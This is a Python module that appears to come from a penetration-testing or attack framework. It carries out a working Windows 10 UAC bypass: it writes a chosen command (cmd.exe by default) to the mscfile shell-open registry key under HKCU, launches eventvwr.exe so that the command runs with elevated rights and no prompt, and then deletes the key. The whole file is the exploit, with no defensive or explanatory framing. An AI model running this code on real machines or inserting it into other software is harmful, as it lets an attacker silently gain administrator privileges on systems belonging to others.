import os
import ctypes
import winreg
import platform

from lib.utils.log import lprint, colored
from modules.base import BaseModule

class BypassUAC(BaseModule):
    """docstring for BypassUAC"""

    def __init__(self):
        super(BypassUAC, self).__init__()
        module_type, module_path = __file__.split(self.module_path+os.sep)[-1].replace(".py", "").split(os.sep, 1)
        using_module = "{module_type}({module_path})".format(
                                        module_type=module_type,
                                        module_path=colored(module_path.replace(os.sep, "/"), "red")
                                    )
        self.using_module = using_module
        #---------------------------Module variable----------------------------------
        self.PROC_PATH            = r'%WINDIR%\System32\eventvwr.exe'
        self.REG_PATH              = r'Software\Classes\mscfile\shell\open\command'
        #---------------------------Module options-----------------------------------
        self.initialization({
            "EXEC_PROC": {"default": r"C:\Windows\System32\cmd.exe", "required": "Yes", "description": "Bypass uac process path"},
        })

    def is_running_as_admin(self):
        '''
        Checks if the script is running with administrative privileges.
        Returns True if is running as admin, False otherwise.
        '''
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def create_reg_key(self, key, value):
        '''
        Creates a reg key
        '''
        try:
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, self.REG_PATH)
            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.REG_PATH, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)
            winreg.CloseKey(registry_key)
        except WindowsError:
            raise

    def delete_reg_key(self):
        '''
        Delete a reg key
        '''
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, self.REG_PATH)
        except WindowsError:
            raise

    def bypass_uac(self, cmd):
        '''
        Tries to bypass the UAC
        '''
        try:
            self.create_reg_key(None, cmd)
            os.system(self.PROC_PATH)
            self.delete_reg_key()
        except WindowsError:
            raise

    def check_win10(self):
        if platform.system().lower() == "windows" and platform.release() == "10":
            return True
        else:
            return False

    def exploit(self):
        if not self.check_win10():
            lprint("WARN", "Target OS now is windows 10.")
            return
        if not self.is_running_as_admin():
            lprint("INFO", "The script is NOT running with administrative privileges")
            lprint("INFO", "Trying to bypass the UAC")
            try:
                self.bypass_uac(self.module_options_dict["data"]["EXEC_PROC"]["default"])
                return
            except WindowsError:
                return
        else:
            lprint("INFO", "The script is running with administrative privileges!")

def main():
    bypass_uac = BypassUAC()
    bypass_uac.console()